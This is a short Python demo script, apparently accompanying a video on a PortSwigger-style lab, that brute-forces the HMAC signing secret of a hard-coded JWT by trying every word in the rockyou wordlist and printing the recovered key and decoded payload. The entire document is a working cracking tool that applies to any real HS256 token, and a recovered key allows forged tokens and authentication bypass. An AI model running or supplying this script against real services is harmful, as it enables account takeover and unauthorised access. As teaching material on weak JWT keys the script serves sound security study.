# Demo script for 'JWT Authentication Bypass via Weak Signing Key' video: https://youtu.be/ov9yT4WAuzI
import jwt

# Paste JWT token here
jwt_token = 'eyJraWQiOiIwOWFlYmI3MS0wYjNjLTQ1OWQtODUxYS03ODY2NmYyYjgyZjYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTI4OTM4Mywic3ViIjoid2llbmVyIn0.TMcv6nw64pvm0gPnINetJwATpTeCeHZntQ2u9v4LbwA'
wordlist_file = '/usr/share/dict/rockyou.txt'

def attempt_fuzzing(secret_key, algorithm):
    try:
        decoded = jwt.decode(jwt_token, secret_key, algorithms=[algorithm])
        print(f"Valid key found: {secret_key}")
        print(f"Decoded payload: {decoded}")
        return True
    except jwt.InvalidSignatureError:
        return False


def fuzz_secret_key(wordlist):
    header = jwt.get_unverified_header(jwt_token)
    algorithm = header.get("alg")
    if not algorithm:
        print("Algorithm not found in JWT header.")
        return None
    else:
        print(f"Algorithm: {algorithm}")

    with open(wordlist, "r") as file:
        for line in file:
            secret_key = line.strip()
            if attempt_fuzzing(secret_key, algorithm):
                return secret_key
    return None


# Start fuzzing
found_key = fuzz_secret_key(wordlist_file)
if found_key:
    print(f"\nSecret key found: {found_key}")
else:
    print("No valid secret key found.")
